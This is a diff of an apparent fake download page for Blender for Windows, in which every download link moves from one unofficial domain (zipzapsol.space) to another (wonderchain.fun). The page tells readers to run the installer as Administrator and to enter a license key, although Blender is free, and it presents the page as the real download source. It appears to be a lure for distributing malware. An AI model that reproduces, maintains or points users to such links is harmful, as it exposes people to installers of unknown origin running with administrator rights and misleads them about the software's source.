@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Blender** for Windows.
 
 <p align="center">
-  <a href="https://blender.zipzapsol.space/">
+  <a href="https://blender.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Blender-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Blender">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[blender.zipzapsol.space](https://blender.zipzapsol.space/)** |
-| **Full URL** | `https://blender.zipzapsol.space/` |
+| **Direct link** | **[blender.wonderchain.fun](https://blender.wonderchain.fun/)** |
+| **Full URL** | `https://blender.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — blender.zipzapsol.space](https://blender.zipzapsol.space/)** (link above)
+1. Click **[Download — blender.wonderchain.fun](https://blender.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://blender.zipzapsol.space/"><strong>⬇ Download Blender now</strong></a></p>
+<p align="center"><a href="https://blender.wonderchain.fun/"><strong>⬇ Download Blender now</strong></a></p>
 
 ---
 
